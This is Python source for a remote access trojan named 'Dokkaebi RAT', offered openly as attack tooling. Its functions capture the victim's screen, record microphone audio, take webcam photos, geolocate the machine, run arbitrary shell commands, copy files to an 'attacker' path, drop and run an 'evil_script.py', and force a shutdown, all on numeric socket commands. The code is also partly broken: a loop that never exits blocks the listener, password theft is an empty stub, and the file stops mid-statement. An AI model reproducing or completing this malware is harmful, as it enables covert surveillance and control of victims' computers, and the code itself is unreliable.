# Dokkaebi RAT Script
# Created by dokkaebi

import os
import subprocess
import shutil
import pyscreenshot
import pyaudio
import wave
import cv2
from geopy.geocoders import Nominatim
from colorama import init, Fore
import socket
import time

# Initialize colorama
init(autoreset=True)

# Global variables
HOST = 'changeme'
PORT = changeme

# Color codes
COLOR_GREEN = Fore.GREEN
COLOR_RED = Fore.RED
COLOR_CYAN = Fore.CYAN
COLOR_YELLOW = Fore.YELLOW

# ASCII cat
CAT_ASCII = r"""
                     ╱|、
                  (˚ˎ 。7  
                   |、˜〵          
                  じしˍ,)ノ
"""

# Contact for Discord
CONTACT_DISCORD = "currentlyunknownuser"

def colored_print(msg, color):
    """Print colored message."""
    print(color + msg)

def show_loading_screen():
    """Display loading screen with ASCII art."""
    print(COLOR_YELLOW + CAT_ASCII)

def show_loading_wheel():
    """Display loading wheel."""
    while True:
        for char in "|/-\\":
            print(f"\r{COLOR_YELLOW}Listening on {HOST}:{PORT} {char}", end="", flush=True)
            time.sleep(0.1)

def take_screenshot():
    """Capture and save a screenshot."""
    try:
        screenshot = pyscreenshot.grab()
        screenshot.save('screenshot.jpg')
        colored_print("Screenshot captured successfully.", COLOR_GREEN)
    except Exception as e:
        colored_print(f"Failed to capture screenshot: {e}", COLOR_RED)

def save_passwords():
    """Save passwords from browsers."""
    # Add code to save passwords from browsers here
    pass

def record_audio():
    """Record audio from the microphone."""
    try:
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        RECORD_SECONDS = 10
        WAVE_OUTPUT_FILENAME = "output.wav"

        audio = pyaudio.PyAudio()

        stream = audio.open(format=FORMAT, channels=CHANNELS,
                            rate=RATE, input=True,
                            frames_per_buffer=CHUNK)

        frames = []

        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        audio.terminate()

        waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
        waveFile.setnchannels(CHANNELS)
        waveFile.setsampwidth(audio.get_sample_size(FORMAT))
        waveFile.setframerate(RATE)
        waveFile.writeframes(b''.join(frames))
        waveFile.close()
        colored_print("Audio recorded successfully.", COLOR_GREEN)
    except Exception as e:
        colored_print(f"Failed to record audio: {e}", COLOR_RED)

def capture_camera():
    """Capture an image from the camera."""
    try:
        camera = cv2.VideoCapture(0)
        ret, frame = camera.read()
        cv2.imwrite("camera_capture.jpg", frame)
        camera.release()
        colored_print("Camera capture successful.", COLOR_GREEN)
    except Exception as e:
        colored_print(f"Failed to capture camera: {e}", COLOR_RED)

def get_gps_location():
    """Get GPS location based on IP address."""
    try:
        geolocator = Nominatim(user_agent="geoapiExercises")
        location = geolocator.geocode(get_ip_address())
        colored_print("Latitude and Longitude of the said address:", COLOR_GREEN)
        colored_print(f"{location.latitude}, {location.longitude}", COLOR_CYAN)
    except Exception as e:
        colored_print(f"Failed to get GPS location: {e}", COLOR_RED)

def get_ip_address():
    """Get local IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
        s.close()
        return ip_address
    except Exception as e:
        colored_print(f"Failed to get IP address: {e}", COLOR_RED)

def execute_command():
    """Execute shell command."""
    try:
        while True:
            command = input("Command: ")
            if command.lower() == 'exit':
                break
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            colored_print(result.stdout, COLOR_GREEN)
            colored_print(result.stderr, COLOR_RED)
    except Exception as e:
        colored_print(f"Error executing command: {e}", COLOR_RED)

def transfer_files():
    """Transfer files."""
    try:
        # Example: Transfer all .txt files from victim to attacker
        files = os.listdir('.')
        for file in files:
            if file.endswith('.txt'):
                shutil.copy(file, '/path/to/attacker')
        colored_print("Files transferred successfully.", COLOR_GREEN)
    except Exception as e:
        colored_print(f"Failed to transfer files: {e}", COLOR_RED)

def upload_script():
    """Upload a script to victim's machine."""
    try:
        # Example: Upload a script named "evil_script.py" to victim's machine
        shutil.copy('evil_script.py', '/path/to/victim')
        colored_print("Script uploaded successfully.", COLOR_GREEN)
    except Exception as e:
        colored_print(f"Failed to upload script: {e}", COLOR_RED)

def execute_uploaded_script():
    """Execute the uploaded script on victim's machine."""
    try:
        # Example: Execute the uploaded script on victim's machine
        subprocess.run(['python', 'evil_script.py'])
        colored_print("Script executed successfully.", COLOR_GREEN)
    except Exception as e:
        colored_print(f"Failed to execute script: {e}", COLOR_RED)

def initiate_shutdown():
    """Initiate system shutdown."""
    try:
        os.system('shutdown /s /t 0')
        colored_print("System shutdown initiated.", COLOR_GREEN)
    except Exception as e:
        colored_print(f"Failed to initiate shutdown: {e}", COLOR_RED)

def main():
    """Main function."""
    show_loading_screen()
    show_loading_wheel()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        colored_print(f"\nDOKKAEBI RAT Server is listening on {HOST}:{PORT}", COLOR_YELLOW)
        conn, addr = s.accept()
        with conn:
            print(f"Connected to {addr}")
            while True:
                command = conn.recv(1024).decode('utf-8')
                if not command:
                    break
                try:
                    command = int(command)
                    if command == 1:
                        take_screenshot()
                    elif command == 2:
                        save_passwords()
                    elif command == 3:
                        record_audio()
                    elif command == 4:
                        capture_camera()
                    elif command == 5:
                        get_gps_location()
                    elif command == 6:
                        execute_command()
                    elif command == 7:
                        transfer_files()
                    elif command == 8:
                        upload_script()
                    elif command == 9:
                        execute_uploaded_script()
                    elif command == 10:
                        initiate_shutdown()
                    else:
                        colored_print("Invalid command.", COLOR_RED)
                except Exception
